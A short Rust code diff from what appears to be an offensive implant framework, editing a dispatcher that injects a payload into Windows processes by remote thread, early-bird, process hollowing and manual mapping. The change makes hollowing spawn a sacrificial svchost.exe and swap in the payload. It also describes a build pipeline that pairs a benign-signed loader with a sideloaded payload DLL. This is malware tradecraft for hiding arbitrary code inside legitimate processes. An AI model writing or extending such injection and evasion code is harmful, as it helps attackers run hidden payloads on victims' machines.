@@ -33,7 +33,10 @@ pub fn inject_with_method(method: InjectionMethod, pid: u32, payload: &[u8]) -> 
         InjectionMethod::RemoteThread  => remote_thread::RemoteThreadInjector.inject(pid, payload),
         InjectionMethod::EarlyBird     => early_bird::EarlyBirdInjector.inject(pid, payload),
         InjectionMethod::Hollowing     => {
-            hollowing::windows_impl::inject_into_process(pid, payload)
+            // True process hollowing: spawn a sacrificial svchost.exe and replace its image.
+            // The PID parameter is unused; hollowing creates its own host process.
+            let _ = pid;
+            hollowing::hollow_and_execute(payload)
                 .map_err(|e| anyhow::anyhow!("{}", e))
         }
         InjectionMethod::ManualMap     => {
@@ -42,9 +45,14 @@ pub fn inject_with_method(method: InjectionMethod, pid: u32, payload: &[u8]) -> 
                 .map_err(|e| anyhow::anyhow!("{}", e))
         }
         InjectionMethod::DllSideLoad   => {
-            // DLL side-loading requires a disk-based DLL; not supported as
-            // in-process shellcode injection.  Use ManualMap for in-memory.
-            Err(anyhow::anyhow!("DllSideLoad requires a file path; use ManualMap for in-memory shellcode"))
+            // DLL side-loading uses the orchestra-side-load-gen pipeline at
+            // build time to produce a benign-signed loader EXE + a sideloaded
+            // DLL containing the payload.  Runtime in-process injection is
+            // not supported for this method by design.
+            Err(anyhow::anyhow!(
+                "DllSideLoad is a build-time technique (see orchestra-side-load-gen); \
+                 not available as in-process injection"
+            ))
         }
     }
 }
